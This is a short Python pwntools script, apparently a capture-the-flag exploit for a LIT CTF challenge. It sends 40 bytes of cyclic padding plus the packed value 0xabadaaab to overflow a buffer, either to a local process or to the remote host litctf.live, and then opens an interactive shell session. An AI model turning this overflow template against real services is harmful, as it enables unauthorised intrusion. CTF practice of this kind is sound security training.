from pwn import *

import angr
import angrop

binary = args.BIN

context.terminal = ["tmux", "splitw", "-h"]
e = context.binary = ELF(binary)

gs = '''
continue
'''


def start():
    if args.GDB:
        return gdb.debug(e.path, gdbscript=gs)
    elif args.REMOTE:
        return remote('litctf.live', 31786)
    else:
        return process(e.path)


p = start()

p.sendline(cyclic(40)+p64(0xabadaaab))

p.interactive()
